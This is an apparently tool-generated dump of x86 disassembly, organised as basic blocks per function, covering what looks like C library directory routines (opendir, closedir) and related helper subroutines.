|
|
|
v
0xb0a8c8e:	mov	edi, dword ptr [ebx + 0x1bcc]
0xb0a8c94:	mov	ebp, dword ptr [ebx - 0xec]
0xb0a8c9a:	test	edi, edi
0xb0a8c9c:	mov	dword ptr [ebp], 0
0xb0a8ca3:	mov	dword ptr [ebp + 4], 0
0xb0a8caa:	je	0xb0a90f5
None
|
|
|
v
0xb0a8cc6:	mov	eax, dword ptr [esp + 0x18]
0xb0a8cca:	mov	eax, dword ptr [eax + edi*4 - 4]
0xb0a8cce:	cmp	ecx, eax
0xb0a8cd0:	jge	0xb0a9048
None
|
|
|
v
0xb0a8f57:	mov	edi, dword ptr [esp + 0x18]
0xb0a8f5b:	mov	edx, dword ptr [esp + 0x14]
0xb0a8f5f:	cmp	ecx, dword ptr [edi + edx + 0x28]
0xb0a8f63:	jge	0xb0a9026
None
|
|
|
v
0xb0a8d13:	mov	eax, dword ptr [esp + 0x14]
0xb0a8d17:	mov	edx, dword ptr [esp + 0x18]
0xb0a8d1b:	add	eax, esi
0xb0a8d1d:	shr	eax, 1
0xb0a8d1f:	cmp	ecx, dword ptr [edx + eax*4]
0xb0a8d22:	jge	0xb0a8f08
None
|
|
|
v
0xb0a8de6:	mov	edx, dword ptr [ebx + 0x1bb8]
0xb0a8dec:	xor	ecx, ecx
0xb0a8dee:	mov	edi, dword ptr [ebx - 0xb0]
0xb0a8df4:	cmp	edx, dword ptr [ebx + 0x1bb4]
0xb0a8dfa:	setne	cl
0xb0a8dfd:	neg	edx
0xb0a8dff:	mov	dword ptr [edi], ecx
0xb0a8e01:	mov	ecx, dword ptr [ebx - 0xe8]
0xb0a8e07:	test	eax, eax
0xb0a8e09:	mov	dword ptr [ecx], edx
0xb0a8e0b:	je	0xb0a9003
None
|
|
|
v
0xb0a9120:	mov	eax, dword ptr [ebx + 0x1bc4]
0xb0a9126:	add	edi, 1
0xb0a9129:	cmp	eax, edi
0xb0a912b:	jbe	0xb0a91b2
None
|
|
|
v
0xb0a8f08:	mov	edx, eax
0xb0a8f0a:	jmp	0xb0a8d08
None
|
|
|
v
0xb0a8fd5:	mov	edi, dword ptr [esi - 0xc]
0xb0a8fd8:	add	edx, 1
0xb0a8fdb:	sub	eax, 8
0xb0a8fde:	add	edi, 1
0xb0a8fe1:	cmp	dword ptr [esi - 4], edi
0xb0a8fe4:	jne	0xb0a903d
None
|
|
|
v
0xb0a9153:	mov	edx, dword ptr [ebx + 0x1bc0]
0xb0a9159:	mov	dword ptr [ebp + 4], eax
0xb0a915c:	jmp	0xb0a9120
None
|
|
|
v
0xb0a9220:	mov	edi, dword ptr [esp + 0x14]
0xb0a9224:	add	edi, 1
0xb0a9227:	mov	dword ptr [esp + 0x14], edi
0xb0a922b:	mov	edi, dword ptr [esp + 0x18]
0xb0a922f:	cmp	dword ptr [esp + 0x14], edi
0xb0a9233:	jae	0xb0a8de6
None
|
|
|
v
0xb0a8d00:	xor	edx, edx
0xb0a8d02:	lea	esi, dword ptr [esi]
0xb0a8d08:	lea	edi, dword ptr [edx + 1]
0xb0a8d0b:	cmp	esi, edi
0xb0a8d0d:	mov	dword ptr [esp + 0x14], edx
0xb0a8d11:	jbe	0xb0a8d2e
None
|
|
|
v
0xb0a92a8:	mov	esi, dword ptr [ebx + 0x1bcc]
0xb0a92ae:	jmp	0xb0a8d2e
None
|
|
|
v
0xb0a8e1c:	movzx	eax, byte ptr [esi + 4]
0xb0a8e20:	mov	edi, dword ptr [esp + 0x50]
0xb0a8e24:	mov	dword ptr [edi + 0x20], eax
0xb0a8e27:	mov	edi, dword ptr [ebp + eax*4]
0xb0a8e2b:	mov	dword ptr [esp + 4], edi
0xb0a8e2f:	movzx	eax, byte ptr [esi + 5]
0xb0a8e33:	add	eax, dword ptr [ebx + 0x1bbc]
0xb0a8e39:	mov	dword ptr [esp], eax
0xb0a8e3c:	call	0xb07a740
None
|
|
|
v
0xb0a8f35:	mov	eax, dword ptr [esp + 0x4c]
0xb0a8f39:	mov	dword ptr [eax], 1
0xb0a8f3f:	jmp	0xb0a8e9b
None
|
|
|
v
0xb0a8d2e:	lea	eax, dword ptr [esi - 1]
0xb0a8d31:	mov	dword ptr [esp + 0x14], eax
0xb0a8d35:	mov	eax, dword ptr [ebx + 0x1bc8]
0xb0a8d3b:	movzx	edx, byte ptr [eax + esi - 1]
0xb0a8d40:	mov	eax, dword ptr [ebx + 0x1bc0]
0xb0a8d46:	lea	eax, dword ptr [eax + edx*8]
0xb0a8d49:	movzx	edi, byte ptr [eax + 4]
0xb0a8d4d:	movzx	eax, byte ptr [eax + 5]
0xb0a8d51:	add	eax, dword ptr [ebx + 0x1bbc]
0xb0a8d57:	mov	dword ptr [esp], eax
0xb0a8d5a:	call	0xb0a70d0
None
|
|
|
v
0xb0a91b6:	lea	ecx, dword ptr [edi*8]
0xb0a91bd:	movzx	eax, byte ptr [edx + ecx + 5]
0xb0a91c2:	add	eax, dword ptr [ebx + 0x1bbc]
0xb0a91c8:	mov	dword ptr [esp + 0x14], ecx
0xb0a91cc:	mov	dword ptr [esp], eax
0xb0a91cf:	call	0xb0a70d0
None
|
|
|
v
0xb0a8ef4:	mov	eax, dword ptr [esp + 0x18]
0xb0a8ef8:	sub	esi, 1
0xb0a8efb:	cmp	ecx, dword ptr [eax + esi*4 - 4]
0xb0a8eff:	jl	0xb0a8ef8
None
|
|
|
v
0xb0a8ea8:	mov	edx, edi
0xb0a8eaa:	sub	edx, eax
0xb0a8eac:	mov	eax, edx
0xb0a8eae:	sub	eax, 1
0xb0a8eb1:	mov	dword ptr [esp + 0x1c], edx
0xb0a8eb5:	lea	edx, dword ptr [eax*4]
0xb0a8ebc:	mov	dword ptr [esp + 0x14], edx
0xb0a8ec0:	mov	edx, dword ptr [esp + 0x18]
0xb0a8ec4:	cmp	ecx, dword ptr [edx + eax*4]
0xb0a8ec7:	jge	0xb0a8f48
None
|
|
|
v
0xb0a8e11:	mov	edi, dword ptr [ebp + 4]
0xb0a8e14:	test	edi, edi
0xb0a8e16:	je	0xb0a8ff8
None
|
|
|
v
0xb0a90c4:	mov	esi, dword ptr [ebx + 0x1bbc]
0xb0a90ca:	mov	dword ptr [ebp], eax
0xb0a90cd:	mov	dword ptr [esp], esi
0xb0a90d0:	call	0xb07ae80
None
|
|
|
v
0xb0a8e88:	mov	ebp, eax
0xb0a8e8a:	sub	eax, 8
0xb0a8e8d:	cmp	dword ptr [eax + 8], esi
0xb0a8e90:	jle	0xb0a8f10
None
|
|
|
v
0xb0a8d8b:	movzx	eax, byte ptr [ecx + esi]
0xb0a8d8f:	lea	eax, dword ptr [edx + eax*8]
0xb0a8d92:	movzx	edi, byte ptr [eax + 4]
0xb0a8d96:	movzx	eax, byte ptr [eax + 5]
0xb0a8d9a:	cmp	dword ptr [ebp + edi*4], 0
0xb0a8d9f:	jne	0xb0a8d80
None
|
|
|
v
0xb0a9141:	movzx	eax, byte ptr [ecx + 5]
0xb0a9145:	add	eax, dword ptr [ebx + 0x1bbc]
0xb0a914b:	mov	dword ptr [esp], eax
0xb0a914e:	call	0xb0a70d0
None
|
|
|
v
0xb0a915e:	lea	eax, dword ptr [ebx - 0x4912b]
0xb0a9164:	mov	dword ptr [esp + 0xc], eax
0xb0a9168:	lea	eax, dword ptr [ebx - 0x4915d]
0xb0a916e:	mov	dword ptr [esp + 4], eax
0xb0a9172:	lea	eax, dword ptr [ebx - 0x4411c]
0xb0a9178:	mov	dword ptr [esp + 8], 0x312
0xb0a9180:	mov	dword ptr [esp], eax
0xb0a9183:	call	0xb027820
None
|
|
|
v
0xb0a913d:	test	eax, eax
0xb0a913f:	jne	0xb0a9120
None
|
|
|
v
0xb0a8fb3:	add	edx, 1
0xb0a8fb6:	cmp	edx, eax
0xb0a8fb8:	jne	0xb0a8e9b
None
|
|
|
v
0xb0a9094:	mov	edx, dword ptr [ebx + 0x1bb0]
0xb0a909a:	mov	edi, dword ptr [ebx + 0x1bac]
0xb0a90a0:	lea	eax, dword ptr [edi + edx*8]
0xb0a90a3:	cmp	eax, dword ptr [ebx + 0x1bbc]
0xb0a90a9:	jne	0xb0a8e65
None
|
|
|
v
0xb0a8d08:	lea	edi, dword ptr [edx + 1]
0xb0a8d0b:	cmp	esi, edi
0xb0a8d0d:	mov	dword ptr [esp + 0x14], edx
0xb0a8d11:	jbe	0xb0a8d2e
None
|
|
|
v
0xb0a8da1:	add	eax, dword ptr [ebx + 0x1bbc]
0xb0a8da7:	mov	dword ptr [esp], eax
0xb0a8daa:	call	0xb0a70d0
None
|
|
|
v
0xb0a9109:	cmp	byte ptr [edx + 4], 0
0xb0a910d:	je	0xb0a91ef
None
|
|
|
v
0xb0a8cb0:	mov	eax, dword ptr [ebx + 0xed4]
0xb0a8cb6:	mov	ecx, dword ptr [esp + 0x40]
0xb0a8cba:	cmp	dword ptr [eax], ecx
0xb0a8cbc:	mov	dword ptr [esp + 0x18], eax
0xb0a8cc0:	jg	0xb0a90f5
None
|
|
|
v
0xb0a927e:	lea	eax, dword ptr [ebx - 0x4912b]
0xb0a9284:	mov	dword ptr [esp + 0xc], eax
0xb0a9288:	lea	eax, dword ptr [ebx - 0x4915d]
0xb0a928e:	mov	dword ptr [esp + 4], eax
0xb0a9292:	lea	eax, dword ptr [ebx - 0x4913a]
0xb0a9298:	mov	dword ptr [esp + 8], 0x2ad
0xb0a92a0:	mov	dword ptr [esp], eax
0xb0a92a3:	call	0xb027820
None
|
|
|
v
0xb0a913a:	mov	eax, dword ptr [ebp + 4]
0xb0a913d:	test	eax, eax
0xb0a913f:	jne	0xb0a9120
None
|
|
|
v
0xb0a8d28:	mov	esi, eax
0xb0a8d2a:	cmp	esi, edi
0xb0a8d2c:	ja	0xb0a8d13
None
|
|
|
v
0xb0a91f5:	mov	esi, dword ptr [ebx + 0x1bc4]
0xb0a91fb:	cmp	edi, esi
0xb0a91fd:	mov	dword ptr [esp + 0x18], esi
0xb0a9201:	jae	0xb0a91e2
None
|
|
|
v
0xb0a9239:	mov	edi, edx
0xb0a923b:	add	edx, 8
0xb0a923e:	cmp	byte ptr [edx - 4], 0
0xb0a9242:	je	0xb0a9220
None
|
|
|
v
0xb0a8ee0:	mov	esi, eax
0xb0a8ee2:	mov	edi, dword ptr [esp + 0x14]
0xb0a8ee6:	mov	eax, dword ptr [esp + 0x18]
0xb0a8eea:	cmp	ecx, dword ptr [eax + edi - 4]
0xb0a8eee:	jge	0xb0a8d2e
None
|
|
|
v
0xb0a8f26:	mov	ecx, dword ptr [esp + 0x14]
0xb0a8f2a:	mov	eax, dword ptr [ebp + 4]
0xb0a8f2d:	test	ecx, ecx
0xb0a8f2f:	jne	0xb0a8f80
None
|
|
|
v
0xb0a9273:	mov	eax, dword ptr [ebp + 4]
0xb0a9276:	mov	dword ptr [ebp], eax
0xb0a9279:	jmp	0xb0a8ddb
None
|
|
|
v
0xb0a8ddb:	mov	edi, dword ptr [esp + 0x14]
0xb0a8ddf:	movzx	ecx, byte ptr [ecx + edi]
0xb0a8de3:	lea	esi, dword ptr [edx + ecx*8]
0xb0a8de6:	mov	edx, dword ptr [ebx + 0x1bb8]
0xb0a8dec:	xor	ecx, ecx
0xb0a8dee:	mov	edi, dword ptr [ebx - 0xb0]
0xb0a8df4:	cmp	edx, dword ptr [ebx + 0x1bb4]
0xb0a8dfa:	setne	cl
0xb0a8dfd:	neg	edx
0xb0a8dff:	mov	dword ptr [edi], ecx
0xb0a8e01:	mov	ecx, dword ptr [ebx - 0xe8]
0xb0a8e07:	test	eax, eax
0xb0a8e09:	mov	dword ptr [ecx], edx
0xb0a8e0b:	je	0xb0a9003
None
|
|
|
v
0xb0a8e59:	mov	edx, dword ptr [ebx + 0x1bb0]
0xb0a8e5f:	mov	edi, dword ptr [ebx + 0x1bac]
0xb0a8e65:	mov	eax, dword ptr [esp + 0x48]
0xb0a8e69:	mov	esi, dword ptr [esp + 0x40]
0xb0a8e6d:	mov	dword ptr [eax], 0
0xb0a8e73:	mov	eax, dword ptr [esp + 0x4c]
0xb0a8e77:	mov	dword ptr [eax], 0
0xb0a8e7d:	lea	eax, dword ptr [edi + edx*8 - 8]
0xb0a8e81:	jmp	0xb0a8e94
None
|
|
|
v
0xb0a9203:	mov	edx, dword ptr [ebx + 0x1bc0]
0xb0a9209:	lea	esi, dword ptr [edx + ecx]
0xb0a920c:	cmp	byte ptr [esi + 4], 0
0xb0a9210:	jne	0xb0a9246
None
|
|
|
v
0xb0a8f78:	jmp	0xb0a8d2e
None
|
|
|
v
0xb0a901e:	mov	dword ptr [ebp], eax
0xb0a9021:	jmp	0xb0a8e11
None
|
|
|
v
0xb0a91e2:	add	ecx, dword ptr [ebx + 0x1bc0]
0xb0a91e8:	mov	esi, ecx
0xb0a91ea:	jmp	0xb0a8de6
None
|
|
|
v
0xb0a9010:	mov	eax, dword ptr [ebx + 0x1bbc]
0xb0a9016:	mov	dword ptr [esp], eax
0xb0a9019:	call	0xb0a70d0
None
|
|
|
v
0xb0a8dce:	nop	
None
|
|
|
v
0xb0a91d4:	mov	edx, dword ptr [ebp + 4]
0xb0a91d7:	mov	ecx, dword ptr [esp + 0x14]
0xb0a91db:	test	edx, edx
0xb0a91dd:	mov	dword ptr [ebp], eax
0xb0a91e0:	je	0xb0a91f5
None
|
|
|
v
0xb0a9026:	mov	edx, dword ptr [esp + 0x1c]
0xb0a902a:	jmp	0xb0a8d08
None
|
|
|
v
0xb0a90af:	cmp	dword ptr [ebx + 0x1bc4], 2
0xb0a90b6:	jne	0xb0a927e
None
|
|
|
v
0xb0a9212:	add	edi, 1
0xb0a9215:	mov	dword ptr [esp + 0x14], edi
0xb0a9219:	lea	edx, dword ptr [edx + edi*8]
0xb0a921c:	jmp	0xb0a922b
None
|
|
|
v
0xb0a8daf:	mov	ecx, dword ptr [ebx + 0x1bc8]
0xb0a8db5:	mov	edx, dword ptr [ebx + 0x1bc0]
0xb0a8dbb:	mov	dword ptr [ebp + edi*4], eax
0xb0a8dbf:	mov	eax, 1
0xb0a8dc4:	sub	eax, edi
0xb0a8dc6:	mov	eax, dword ptr [ebp + eax*4]
0xb0a8dca:	test	eax, eax
0xb0a8dcc:	je	0xb0a8d80
None
|
|
|
v
0xb0a8f10:	mov	dword ptr [esp + 0x14], ecx
0xb0a8f14:	mov	eax, dword ptr [ebp + 4]
0xb0a8f17:	mov	ecx, dword ptr [esp + 0x48]
0xb0a8f1b:	mov	dword ptr [ecx], eax
0xb0a8f1d:	cmp	esi, dword ptr [ebp]
0xb0a8f20:	jne	0xb0a8e9b
None
|
|
|
v
0xb0a8d80:	add	esi, 1
0xb0a8d83:	cmp	dword ptr [ebx + 0x1bcc], esi
0xb0a8d89:	jbe	0xb0a8dd0
None
|
|
|
v
0xb0a92b3:	mov	esi, edi
0xb0a92b5:	jmp	0xb0a8d2e
None
|
|
|
v
0xb0a9188:	lea	eax, dword ptr [ebx - 0x4912b]
0xb0a918e:	mov	dword ptr [esp + 0xc], eax
0xb0a9192:	lea	eax, dword ptr [ebx - 0x4915d]
0xb0a9198:	mov	dword ptr [esp + 4], eax
0xb0a919c:	lea	eax, dword ptr [ebx - 0x49154]
0xb0a91a2:	mov	dword ptr [esp + 8], 0x30b
0xb0a91aa:	mov	dword ptr [esp], eax
0xb0a91ad:	call	0xb027820
None
|
|
|
v
0xb0a91ef:	xor	ecx, ecx
0xb0a91f1:	xor	edi, edi
0xb0a91f3:	jmp	0xb0a91bd
None
|
|
|
v
0xb0a925c:	mov	ecx, dword ptr [esp + 0x14]
0xb0a9260:	add	ecx, dword ptr [ebx + 0x1bc0]
0xb0a9266:	mov	esi, ecx
0xb0a9268:	mov	dword ptr [ebp + 4], eax
0xb0a926b:	mov	eax, dword ptr [ebp]
0xb0a926e:	jmp	0xb0a8de6
None
|
|
|
v
0xb0a903d:	mov	eax, dword ptr [esp + 0x4c]
0xb0a9041:	mov	dword ptr [eax], ebp
0xb0a9043:	jmp	0xb0a8e9b
None
|
|
|
v
0xb0a8fbe:	lea	eax, dword ptr [edi + ecx*8]
0xb0a8fc1:	mov	edx, 2
0xb0a8fc6:	jmp	0xb0a8fe6
None
|
|
|
v
0xb0a9244:	mov	esi, edi
0xb0a9246:	movzx	eax, byte ptr [esi + 5]
0xb0a924a:	add	eax, dword ptr [ebx + 0x1bbc]
0xb0a9250:	mov	dword ptr [esp + 0x14], ecx
0xb0a9254:	mov	dword ptr [esp], eax
0xb0a9257:	call	0xb0a70d0
None
|
|
|
v
0xb0a8e9b:	add	esp, 0x2c
0xb0a8e9e:	pop	ebx
0xb0a8e9f:	pop	esi
0xb0a8ea0:	pop	edi
0xb0a8ea1:	pop	ebp
0xb0a8ea2:	ret	
None
|
|
|
v
0xb0a902f:	mov	esi, dword ptr [esp + 0x1c]
0xb0a9033:	xor	edx, edx
0xb0a9035:	sub	esi, 0xb
0xb0a9038:	jmp	0xb0a8d08
None
|
|
|
v
0xb0a8f48:	mov	edx, dword ptr [esp + 0x1c]
0xb0a8f4c:	add	edx, 9
0xb0a8f4f:	cmp	edi, edx
0xb0a8f51:	mov	dword ptr [esp + 0x1c], edx
0xb0a8f55:	jbe	0xb0a8f69
None
|
|
|
v
0xb0a9113:	mov	ecx, edx
0xb0a9115:	xor	eax, eax
0xb0a9117:	xor	edi, edi
0xb0a9119:	jmp	0xb0a913d
None
|
|
|
v
0xb0a8d77:	jmp	0xb0a8dd0
None
|
|
|
v
0xb0a8e94:	test	edx, edx
0xb0a8e96:	lea	ecx, dword ptr [edx - 1]
0xb0a8e99:	jne	0xb0a8e88
None
|
|
|
v
0xb0a8d5f:	mov	ecx, dword ptr [ebx + 0x1bc8]
0xb0a8d65:	cmp	esi, dword ptr [ebx + 0x1bcc]
0xb0a8d6b:	mov	edx, dword ptr [ebx + 0x1bc0]
0xb0a8d71:	mov	dword ptr [ebp + edi*4], eax
0xb0a8d75:	jb	0xb0a8d8b
None
|
|
|
v
0xb0a8fed:	mov	eax, dword ptr [esp + 0x4c]
0xb0a8ff1:	mov	dword ptr [eax], edx
0xb0a8ff3:	jmp	0xb0a8e9b
None
|
|
|
v
0xb0a8f80:	lea	ebp, dword ptr [edi + edx*8 - 0x10]
0xb0a8f84:	mov	edx, dword ptr [ebp + 4]
0xb0a8f87:	cmp	edx, eax
0xb0a8f89:	jge	0xb0a8e9b
None
|
|
|
v
0xb0a91b2:	cmp	eax, edi
0xb0a91b4:	je	0xb0a91ef
None
|
|
|
v
0xb0a90bc:	mov	dword ptr [esp], eax
0xb0a90bf:	call	0xb0a70d0
None
|
|
|
v
0xb0a8f01:	jmp	0xb0a8d2e
None
|
|
|
v
0xb0a8e92:	mov	edx, ecx
0xb0a8e94:	test	edx, edx
0xb0a8e96:	lea	ecx, dword ptr [edx - 1]
0xb0a8e99:	jne	0xb0a8e88
None
|
|
|
v
0xb0a8ec9:	cmp	eax, 9
0xb0a8ecc:	jbe	0xb0a8ee0
None
|
|
|
v
0xb0a8f8f:	mov	ecx, dword ptr [esp + 0x4c]
0xb0a8f93:	mov	dword ptr [ecx], 1
0xb0a8f99:	mov	ecx, dword ptr [esp + 0x14]
0xb0a8f9d:	test	ecx, ecx
0xb0a8f9f:	je	0xb0a8e9b
None
|
|
|
v
0xb0a8fc8:	mov	edi, dword ptr [eax - 0x10]
0xb0a8fcb:	mov	esi, eax
0xb0a8fcd:	add	edi, 1
0xb0a8fd0:	cmp	dword ptr [eax - 8], edi
0xb0a8fd3:	jne	0xb0a8fed
None
|
|
|
v
0xb0a9003:	cmp	dword ptr [ebx + 0x1bc4], 1
0xb0a900a:	jne	0xb0a9188
None
|
|
|
v
0xb0a8f70:	add	esi, 1
0xb0a8f73:	cmp	ecx, dword ptr [eax + esi*4]
0xb0a8f76:	jge	0xb0a8f70
None
|
|
|
v
0xb0a8e49:	mov	eax, dword ptr [esp + 0x50]
0xb0a8e4d:	mov	dword ptr [eax + 0x28], edi
0xb0a8e50:	mov	eax, dword ptr [esi]
0xb0a8e52:	mov	edi, dword ptr [esp + 0x50]
0xb0a8e56:	mov	dword ptr [edi + 0x24], eax
0xb0a8e59:	mov	edx, dword ptr [ebx + 0x1bb0]
0xb0a8e5f:	mov	edi, dword ptr [ebx + 0x1bac]
0xb0a8e65:	mov	eax, dword ptr [esp + 0x48]
0xb0a8e69:	mov	esi, dword ptr [esp + 0x40]
0xb0a8e6d:	mov	dword ptr [eax], 0
0xb0a8e73:	mov	eax, dword ptr [esp + 0x4c]
0xb0a8e77:	mov	dword ptr [eax], 0
0xb0a8e7d:	lea	eax, dword ptr [edi + edx*8 - 8]
0xb0a8e81:	jmp	0xb0a8e94
None
|
|
|
v
0xb0a9048:	mov	eax, dword ptr [ebx + 0x1ba8]
0xb0a904e:	test	eax, eax
0xb0a9050:	je	0xb0a92b3
None
|
|
|
v
0xb0a8c70:	push	ebp
0xb0a8c71:	push	edi
0xb0a8c72:	push	esi
0xb0a8c73:	push	ebx
0xb0a8c74:	sub	esp, 0x2c
0xb0a8c77:	mov	esi, dword ptr [esp + 0x44]
0xb0a8c7b:	call	0xb1267db
None
|
|
|
v
0xb0a8ece:	mov	edi, dword ptr [esp + 0x18]
0xb0a8ed2:	mov	esi, dword ptr [esp + 0x14]
0xb0a8ed6:	cmp	ecx, dword ptr [edi + esi - 0x28]
0xb0a8eda:	jl	0xb0a902f
None
|
|
|
v
0xb0a905e:	mov	eax, dword ptr [esp + 0x50]
0xb0a9062:	mov	dword ptr [esp + 4], 0
0xb0a906a:	mov	dword ptr [esp + 8], eax
0xb0a906e:	lea	eax, dword ptr [esp + 0x40]
0xb0a9072:	mov	dword ptr [esp], eax
0xb0a9075:	call	0xb0a5d40
None
|
|
|
v
0xb0a90e1:	mov	edx, dword ptr [ebx + 0x1bb0]
0xb0a90e7:	mov	edi, dword ptr [ebx + 0x1bac]
0xb0a90ed:	mov	dword ptr [ebp + 4], eax
0xb0a90f0:	jmp	0xb0a8e65
None
|
|
|
v
0xb0a9246:	movzx	eax, byte ptr [esi + 5]
0xb0a924a:	add	eax, dword ptr [ebx + 0x1bbc]
0xb0a9250:	mov	dword ptr [esp + 0x14], ecx
0xb0a9254:	mov	dword ptr [esp], eax
0xb0a9257:	call	0xb0a70d0
None
|
|
|
v
0xb0a90d5:	lea	eax, dword ptr [esi + eax + 1]
0xb0a90d9:	mov	dword ptr [esp], eax
0xb0a90dc:	call	0xb0a70d0
None
|
|
|
v
0xb0a8f31:	test	eax, eax
0xb0a8f33:	jle	0xb0a8f80
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0b1170
TOTAL BLOCKS :20
0xb0b1289:	xchg	ebx, ecx
0xb0b128b:	xor	eax, eax
0xb0b128d:	mov	dword ptr [ebp + edx], esi
0xb0b1291:	jmp	0xb0b11ea
None
|
|
|
v
0xb0b1170:	push	ebp
0xb0b1171:	mov	ebp, edx
0xb0b1173:	push	edi
0xb0b1174:	mov	edi, eax
0xb0b1176:	push	esi
0xb0b1177:	push	ebx
0xb0b1178:	sub	esp, 0x1c
0xb0b117b:	call	0xb1267db
None
|
|
|
v
0xb0b11f8:	cmp	eax, 0x8000
0xb0b11fd:	mov	esi, 0x8000
0xb0b1202:	cmovae	esi, eax
0xb0b1205:	lea	eax, dword ptr [esi + 0x1c]
0xb0b1208:	jmp	0xb0b11b2
None
|
|
|
v
0xb0b1230:	xor	eax, eax
0xb0b1232:	jmp	0xb0b11ea
None
|
|
|
v
0xb0b1228:	test	eax, eax
0xb0b122a:	jns	0xb0b1196
None
|
|
|
v
0xb0b1180:	add	ebx, 0xf9e80
0xb0b1186:	test	dl, dl
0xb0b1188:	mov	esi, dword ptr [esp + 0x30]
0xb0b118c:	jne	0xb0b1196
None
|
|
|
v
0xb0b11c2:	mov	dword ptr [eax], edi
0xb0b11c4:	mov	dword ptr [eax + 4], 0
0xb0b11cb:	mov	dword ptr [eax + 8], esi
0xb0b11ce:	mov	dword ptr [eax + 0xc], 0
0xb0b11d5:	mov	dword ptr [eax + 0x10], 0
0xb0b11dc:	mov	dword ptr [eax + 0x14], 0
0xb0b11e3:	mov	dword ptr [eax + 0x18], 0
0xb0b11ea:	add	esp, 0x1c
0xb0b11ed:	pop	ebx
0xb0b11ee:	pop	esi
0xb0b11ef:	pop	edi
0xb0b11f0:	pop	ebp
0xb0b11f1:	ret	4
None
|
|
|
v
0xb0b11ea:	add	esp, 0x1c
0xb0b11ed:	pop	ebx
0xb0b11ee:	pop	esi
0xb0b11ef:	pop	edi
0xb0b11f0:	pop	ebp
0xb0b11f1:	ret	4
None
|
|
|
v
0xb0b1238:	mov	eax, 0x801c
0xb0b123d:	mov	si, 0x8000
0xb0b1241:	jmp	0xb0b11b2
None
|
|
|
v
0xb0b119e:	mov	eax, dword ptr [esi + 0x34]
0xb0b11a1:	cmp	eax, 0xfffff
0xb0b11a6:	jbe	0xb0b11f8
None
|
|
|
v
0xb0b1261:	mov	eax, ebp
0xb0b1263:	test	al, al
0xb0b1265:	je	0xb0b1230
None
|
|
|
v
0xb0b1196:	test	esi, esi
0xb0b1198:	je	0xb0b1238
None
|
|
|
v
0xb0b11ba:	test	eax, eax
0xb0b11bc:	je	0xb0b1248
None
|
|
|
v
0xb0b1248:	mov	dword ptr [esp], 0x201c
0xb0b124f:	mov	esi, 0x2000
0xb0b1254:	call	0xb0173f0
None
|
|
|
v
0xb0b11b2:	mov	dword ptr [esp], eax
0xb0b11b5:	call	0xb0173f0
None
|
|
|
v
0xb0b1259:	test	eax, eax
0xb0b125b:	jne	0xb0b11c2
None
|
|
|
v
0xb0b1210:	mov	dword ptr [esp + 8], 1
0xb0b1218:	mov	dword ptr [esp + 4], 2
0xb0b1220:	mov	dword ptr [esp], edi
0xb0b1223:	call	0xb0db490
None
|
|
|
v
0xb0b118e:	and	ecx, 0x80000
0xb0b1194:	je	0xb0b1210
None
|
|
|
v
0xb0b1267:	mov	ecx, dword ptr gs:[0]
0xb0b126e:	mov	edx, dword ptr [ebx - 0xdc]
0xb0b1274:	mov	ebp, ecx
0xb0b1276:	mov	esi, dword ptr [ecx + edx]
0xb0b1279:	mov	ecx, edi
0xb0b127b:	xchg	ebx, ecx
0xb0b127d:	mov	eax, 6
0xb0b1282:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb0b11a8:	mov	eax, 0x10001c
0xb0b11ad:	mov	esi, 0x100000
0xb0b11b2:	mov	dword ptr [esp], eax
0xb0b11b5:	call	0xb0173f0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0b12a0
TOTAL BLOCKS :9
0xb0b12d7:	mov	dword ptr [esp], 0
0xb0b12de:	xor	ecx, ecx
0xb0b12e0:	mov	edx, 1
0xb0b12e5:	call	0xb0b1170
None
|
|
|
v
0xb0b130a:	xor	eax, eax
0xb0b130c:	jmp	0xb0b12ed
None
|
|
|
v
0xb0b12ea:	sub	esp, 4
0xb0b12ed:	mov	ebx, dword ptr [ebp - 4]
0xb0b12f0:	leave	
0xb0b12f1:	ret	
None
|
|
|
v
0xb0b12b7:	mov	dword ptr [esp + 0xc], 0
0xb0b12bf:	mov	dword ptr [esp + 8], 0x98800
0xb0b12c7:	mov	dword ptr [esp + 4], edx
0xb0b12cb:	mov	dword ptr [esp], eax
0xb0b12ce:	call	0xb0daca0
None
|
|
|
v
0xb0b12f2:	mov	eax, dword ptr [ebx - 0xdc]
0xb0b12f8:	mov	edx, dword ptr gs:[0]
0xb0b12ff:	mov	dword ptr [edx + eax], 2
0xb0b1306:	xor	eax, eax
0xb0b1308:	jmp	0xb0b12ed
None
|
|
|
v
0xb0b12d3:	test	eax, eax
0xb0b12d5:	js	0xb0b130a
None
|
|
|
v
0xb0b12ed:	mov	ebx, dword ptr [ebp - 4]
0xb0b12f0:	leave	
0xb0b12f1:	ret	
None
|
|
|
v
0xb0b12a0:	push	ebp
0xb0b12a1:	mov	ebp, esp
0xb0b12a3:	push	ebx
0xb0b12a4:	sub	esp, 0x14
0xb0b12a7:	call	0xb1267db
None
|
|
|
v
0xb0b12ac:	add	ebx, 0xf9d54
0xb0b12b2:	cmp	byte ptr [edx], 0
0xb0b12b5:	je	0xb0b12f2
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:opendir
TOTAL BLOCKS :3
0xb0b1310:	push	ebx
0xb0b1311:	mov	eax, 0xffffff9c
0xb0b1316:	call	0xb1267db
None
|
|
|
v
0xb0b131b:	add	ebx, 0xf9ce5
0xb0b1321:	sub	esp, 8
0xb0b1324:	mov	edx, dword ptr [esp + 0x10]
0xb0b1328:	call	0xb0b12a0
None
|
|
|
v
0xb0b132d:	add	esp, 8
0xb0b1330:	pop	ebx
0xb0b1331:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:closedir
TOTAL BLOCKS :5
0xb0b1340:	push	esi
0xb0b1341:	push	ebx
0xb0b1342:	sub	esp, 0x14
0xb0b1345:	mov	eax, dword ptr [esp + 0x20]
0xb0b1349:	call	0xb1267db
None
|
|
|
v
0xb0b134e:	add	ebx, 0xf9cb2
0xb0b1354:	test	eax, eax
0xb0b1356:	je	0xb0b1370
None
|
|
|
v
0xb0b1358:	mov	esi, dword ptr [eax]
0xb0b135a:	mov	dword ptr [esp], eax
0xb0b135d:	call	0xb017470
None
|
|
|
v
0xb0b1370:	mov	eax, dword ptr [ebx - 0xdc]
0xb0b1376:	mov	edx, dword ptr gs:[0]
0xb0b137d:	mov	dword ptr [edx + eax], 0x16
0xb0b1384:	add	esp, 0x14
0xb0b1387:	mov	eax, 0xffffffff
0xb0b138c:	pop	ebx
0xb0b138d:	pop	esi
0xb0b138e:	ret	
None
|
|
|
v
